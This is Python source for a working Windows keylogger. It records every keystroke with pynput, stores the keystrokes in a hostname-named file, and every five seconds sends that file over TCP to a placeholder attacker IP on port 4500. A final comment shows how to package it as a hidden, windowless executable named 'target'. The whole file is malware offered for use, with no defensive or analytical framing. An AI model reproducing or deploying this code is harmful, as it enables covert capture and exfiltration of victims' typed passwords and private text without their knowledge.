import threading
from pynput import keyboard
import subprocess
import os
import socket
import platform
import time
import winshell
from win32com.client import Dispatch

ENCODING = 'utf-8'
pressed_keys = set()

# Create keystrokes.txt or nothing if already exists
def create_keystrokes_file():
    if not os.path.exists('keystrokes.txt'):
        with open('keystrokes.txt', 'w') as file:
            pass
        print("Created a keystrokes.txt file to write in.")
    else:
        print("keystrokes.txt already exists, writing into an existing one.")

# The logic behind logging the keys
def keylogger_callback(key):
    """
    Processes key press events.
    """
    global pressed_keys
    
    if hasattr(key, 'char') and key.char is not None:  # Check for valid character
        name = key.char
    elif hasattr(key, 'vk'):  # Check for virtual character
        if 96 <= key.vk <= 105:  # Check for numpad
            name = str(key.vk - 96)  # Convert code to characters
        else:
            name = key.vk
    elif hasattr(key, 'name'):
        name = key.name
    else:
        name = 'Unknown'

    # Ignore None values
    if name is None:
        return

    # Record the key press
    pressed_keys.add(name)
    
    # Write keystroke to the file named after the hostname
    hostname = socket.gethostname()
    file_name = f"{hostname}_last_key.txt"
    with open(file_name, 'a', encoding=ENCODING) as last_key_file:
        last_key_file.write(str(name) + '\n')

    # Check if keystrokes.txt exceeds 1000 characters
    with open(file_name, 'r', encoding=ENCODING) as keystrokes_file:
        content = keystrokes_file.read()
        if len(content) >= 10000:
            content = content[5:]
            with open(file_name, 'w', encoding=ENCODING) as keystrokes_file:
                keystrokes_file.write(content)

# Handles key release
def on_release(key):
    global pressed_keys
    if hasattr(key, 'char') or hasattr(key, 'name'):
        name = key.char if hasattr(key, 'char') else key.name
        if name in pressed_keys:
            pressed_keys.remove(name)

# Starts the keylog listening process
def run_listener():
    with keyboard.Listener(on_press=keylogger_callback, on_release=on_release) as listener:
        listener.join()

# Sends the last keystrokes recorded in the last 5 seconds
def send_last_key():
    while True:
        hostname = socket.gethostname()
        file_name = f"{hostname}_last_key.txt"
        
        # Check if the file exists
        if os.path.exists(file_name):
            server_ip = 'YOUT IP HERE'
            server_port = 4500
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
                try:
                    client_socket.connect((server_ip, server_port))
                    print("Connected to server.")

                    # Sends name information
                    client_socket.send(len(file_name).to_bytes(4, byteorder='big'))
                    client_socket.send(file_name.encode())
                    with open(file_name, "rb") as file:
                        file_data = file.read()

                    # Sends the file
                    client_socket.send(len(file_data).to_bytes(8, byteorder='big'))
                    client_socket.send(file_data)

                    print("File sent successfully.")
                except Exception as e:
                    print(f"Error: {e}") # Oops :(

            # Clear the contents for new keylogs
            open(file_name, 'w').close()

        # Sleep for 5 seconds before sending again
        time.sleep(5)

# Main loop
# Handles the whole script
if __name__ == '__main__':
    print("Keylogger initialized without any problems")
    create_keystrokes_file()   # Call the function to create keystrokes.txt

    # Start the keylogger listener thread
    listener_thread = threading.Thread(target=run_listener)
    listener_thread.start()

    # Start the thread for sending last_key.txt
    sender_thread = threading.Thread(target=send_last_key)
    sender_thread.start()

    try:
        listener_thread.join()
        sender_thread.join()
    except KeyboardInterrupt:
        pass

# pyinstaller --onefile --windowed target.py
